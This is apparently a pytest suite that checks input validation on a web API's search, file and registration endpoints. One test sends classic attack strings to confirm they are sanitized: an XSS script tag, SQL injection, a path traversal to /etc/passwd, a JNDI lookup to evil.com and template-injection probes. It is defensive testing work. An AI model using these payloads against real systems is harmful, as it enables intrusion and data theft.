"""Input validation security tests.

Tests input validation and sanitization:
- Malformed JSON/data
- Oversized inputs
- Special characters
- Type confusion
- Null/undefined values
- Extremely long strings
"""

from httpx import AsyncClient
import pytest


class TestJSONValidation:
    """Test JSON input validation."""

    @pytest.mark.asyncio()
    async def test_malformed_json_rejected(self, client: AsyncClient, auth_headers: dict):
        """Test that malformed JSON is rejected."""
        response = await client.post(
            "/api/v1/search",
            headers=auth_headers,
            content=b"{invalid json here}",
        )
        assert response.status_code == 422

    @pytest.mark.asyncio()
    async def test_empty_json_body(self, client: AsyncClient, auth_headers: dict):
        """Test handling of empty JSON body."""
        response = await client.post("/api/v1/search", headers=auth_headers, json={})
        assert response.status_code in [400, 422]

    @pytest.mark.asyncio()
    async def test_null_values_in_json(self, client: AsyncClient, auth_headers: dict):
        """Test handling of null values in JSON."""
        response = await client.post("/api/v1/search", headers=auth_headers, json={"query": None})
        assert response.status_code in [400, 422]


class TestStringValidation:
    """Test string input validation."""

    @pytest.mark.asyncio()
    async def test_oversized_string_rejected(self, client: AsyncClient, auth_headers: dict):
        """Test that extremely long strings are rejected."""
        long_string = "A" * (10 * 1024 * 1024)
        response = await client.post(
            "/api/v1/search", headers=auth_headers, json={"query": long_string}
        )
        assert response.status_code in [400, 413, 422]

    @pytest.mark.asyncio()
    async def test_unicode_characters_handled(self, client: AsyncClient, auth_headers: dict):
        """Test that unicode characters are handled safely."""
        unicode_strings = [
            "测试查询",
            "тестовый запрос",
            "🔥🚀💯",
            "\u0000\u0001\u0002",
        ]

        for unicode_str in unicode_strings:
            response = await client.post(
                "/api/v1/search", headers=auth_headers, json={"query": unicode_str}
            )
            assert response.status_code in [200, 400, 422]

    @pytest.mark.asyncio()
    async def test_control_characters_handled(self, client: AsyncClient, auth_headers: dict):
        """Test that control characters are handled safely."""
        control_chars = "\x00\x01\x02\x03\x04\x05"
        response = await client.post(
            "/api/v1/search", headers=auth_headers, json={"query": control_chars}
        )
        assert response.status_code in [200, 400, 422]


class TestNumericValidation:
    """Test numeric input validation."""

    @pytest.mark.asyncio()
    async def test_negative_numbers_handled(self, client: AsyncClient, auth_headers: dict):
        """Test handling of negative numbers where inappropriate."""
        response = await client.get("/api/v1/files/", headers=auth_headers, params={"limit": -10})
        assert response.status_code in [200, 400, 422]

    @pytest.mark.asyncio()
    async def test_zero_values_handled(self, client: AsyncClient, auth_headers: dict):
        """Test handling of zero values."""
        response = await client.get("/api/v1/files/", headers=auth_headers, params={"limit": 0})
        assert response.status_code in [200, 400, 422]

    @pytest.mark.asyncio()
    async def test_extremely_large_numbers_rejected(self, client: AsyncClient, auth_headers: dict):
        """Test that extremely large numbers are rejected."""
        response = await client.get(
            "/api/v1/files/", headers=auth_headers, params={"limit": 999999999999999}
        )
        assert response.status_code in [200, 400, 422]

    @pytest.mark.asyncio()
    async def test_float_instead_of_int_handled(self, client: AsyncClient, auth_headers: dict):
        """Test handling when float is provided instead of int."""
        response = await client.get("/api/v1/files/", headers=auth_headers, params={"limit": 10.5})
        assert response.status_code in [200, 400, 422]


class TestSpecialCharacters:
    """Test special character handling."""

    @pytest.mark.asyncio()
    @pytest.mark.parametrize(
        "special_chars",
        [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com}",
            "{{7*7}}",
            "${7*7}",
        ],
    )
    async def test_special_characters_sanitized(
        self, client: AsyncClient, auth_headers: dict, special_chars: str
    ):
        """Test that special characters are properly sanitized."""
        response = await client.post(
            "/api/v1/search", headers=auth_headers, json={"query": special_chars}
        )
        assert response.status_code in [200, 400, 422]

        if response.status_code == 200:
            response_text = response.text.lower()
            assert "<script>" not in response_text
            assert "drop table" not in response_text


class TestEmailValidation:
    """Test email address validation."""

    @pytest.mark.asyncio()
    @pytest.mark.parametrize(
        "invalid_email",
        [
            "notanemail",
            "@example.com",
            "user@",
            "user @example.com",
            "user@example",
            "user@.com",
            "",
        ],
    )
    async def test_invalid_email_rejected(self, client: AsyncClient, invalid_email: str):
        """Test that invalid email addresses are rejected."""
        response = await client.post(
            "/api/v1/auth/register",
            json={"username": "testuser123", "email": invalid_email, "password": "SecurePass123!"},
        )
        assert response.status_code == 422

    @pytest.mark.asyncio()
    @pytest.mark.parametrize(
        "valid_email",
        [
            "user@example.com",
            "user.name@example.com",
            "user+tag@example.com",
            "user123@sub.example.com",
        ],
    )
    async def test_valid_email_accepted(self, client: AsyncClient, valid_email: str):
        """Test that valid email addresses are accepted."""
        response = await client.post(
            "/api/v1/auth/register",
            json={
                "username": f"user_{hash(valid_email)}",
                "email": valid_email,
                "password": "SecurePass123!",
            },
        )
        assert response.status_code in [201, 400]


class TestPasswordValidation:
    """Test password validation."""

    @pytest.mark.asyncio()
    async def test_empty_password_rejected(self, client: AsyncClient):
        """Test that empty passwords are rejected."""
        response = await client.post(
            "/api/v1/auth/register",
            json={"username": "testuser", "email": "test@example.com", "password": ""},
        )
        assert response.status_code == 422

    @pytest.mark.asyncio()
    async def test_whitespace_only_password_rejected(self, client: AsyncClient):
        """Test that whitespace-only passwords are rejected."""
        response = await client.post(
            "/api/v1/auth/register",
            json={"username": "testuser", "email": "test@example.com", "password": "     "},
        )
        assert response.status_code in [400, 422]


class TestArrayValidation:
    """Test array input validation."""

    @pytest.mark.asyncio()
    async def test_empty_array_handled(self, client: AsyncClient, auth_headers: dict):
        """Test handling of empty arrays."""
        response = await client.post(
            "/api/v1/batch/search", headers=auth_headers, json={"queries": []}
        )
        assert response.status_code in [200, 400, 404, 422]

    @pytest.mark.asyncio()
    async def test_oversized_array_rejected(self, client: AsyncClient, auth_headers: dict):
        """Test that oversized arrays are rejected."""
        large_array = [f"query_{i}" for i in range(10000)]
        response = await client.post(
            "/api/v1/batch/search", headers=auth_headers, json={"queries": large_array}
        )
        assert response.status_code in [400, 413, 422]


class TestTypeValidation:
    """Test type validation."""

    @pytest.mark.asyncio()
    async def test_string_instead_of_number_rejected(self, client: AsyncClient, auth_headers: dict):
        """Test that string is rejected when number expected."""
        response = await client.get(
            "/api/v1/files/", headers=auth_headers, params={"limit": "not_a_number"}
        )
        assert response.status_code == 422

    @pytest.mark.asyncio()
    async def test_number_instead_of_string_handled(self, client: AsyncClient, auth_headers: dict):
        """Test handling when number provided instead of string."""
        response = await client.post("/api/v1/search", headers=auth_headers, json={"query": 12345})
        assert response.status_code in [200, 422]
